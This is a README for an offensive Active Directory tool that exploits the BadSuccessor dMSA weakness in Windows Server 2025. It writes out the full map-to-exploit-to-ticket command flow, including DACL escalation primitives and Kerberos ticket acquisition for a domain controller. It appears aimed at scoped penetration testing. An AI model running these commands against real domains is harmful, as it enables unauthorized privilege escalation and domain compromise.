# dMSA-Reaper

CLI for Windows Server 2025 AD dMSA mapping, BadSuccessor path selection, LDAP
execution, and verification.

```text
map -> paths -> exploit -> verify -> ticket -> cleanup
```

## Install / Test

```bash
python -m venv .venv
. .venv/bin/activate
pip install -e ".[dev]"
pytest
ruff check .
mypy dmsa_reaper
```

## Flow

```bash
dmsa-reaper map --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps --json state.json
dmsa-reaper paths --state state.json --expand-targets --json paths.json

dmsa-reaper exploit --state state.json --paths paths.json --path BS-7f31... --scope scope.json --dry-run

dmsa-reaper exploit --state state.json --paths paths.json --path BS-7f31... \
  --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps \
  --scope scope.json --confirm --confirm-string corp.local

dmsa-reaper verify --op OP-YYYYMMDD-deadbeef \
  --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps

dmsa-reaper ticket --op OP-YYYYMMDD-deadbeef \
  --ccache /secure/operator.ccache --identity analyst \
  --domain corp.local --dc-host dc01.corp.local --dc-ip 10.0.0.10 \
  --service cifs/dc01.corp.local

dmsa-reaper cleanup --op OP-YYYYMMDD-deadbeef \
  --domain corp.local --dc-ip 10.0.0.10 -u analyst -p 'pass' --use-ldaps
```

Operation journals default to `.reaper/operations`. Private run artifacts are
stored under `.reaper/runs/<operation-id>/`; ccaches and JSON snapshots use
mode `0600`. Use `--ops-dir` or `DMSA_REAPER_OPS_DIR` to relocate journals.

## Surface

Executable primitives: `postpatch-mutual-pair`,
`existing-dmsa-postpatch-mutual`, `legacy-oneway-link`,
`existing-dmsa-legacy-link`, `dacl-container-escalate`,
`dacl-target-escalate`.

Informational only: `self-write-map`, `self-pkinit-loop`; these appear only
with `paths --research`.

Auth support: password bind through ldap3 NTLM, LDAPS with `--use-ldaps`,
STARTTLS with `--start-tls`, and environment Kerberos through ldap3
SASL/GSSAPI with `--kerberos`. The GSSAPI runtime is an install dependency.

Not yet supported consistently for LDAP: pass-the-hash, AES keys, and keytabs.

Writes require a scope file. Created DNs must be under `allowedOUs`; modified
DNs must be under `allowedOUs` or `allowedTargets`; denies win. DACL primitives
also require `allowDaclPrimitives=true`.

## Notes

- LDAP-state verification is not Kerberos verification.
- `verify` checks directory state only; command exit codes and proof JSON are
  never accepted as Kerberos proof.
- `ticket` runs Impacket's dMSA exchange, parses the resulting ccache, binds it
  to the created dMSA, and obtains a requested test service ticket.
- `cleanup` is conflict-aware: it restores an attribute only while the current
  value equals this operation's write, removes only exact ACE fingerprints, and
  deletes created objects only when `objectGUID` matches the journal.
- The DACL primitives require `WriteDACL`/`GenericAll`; `WriteOwner` alone is
  deliberately not executable.
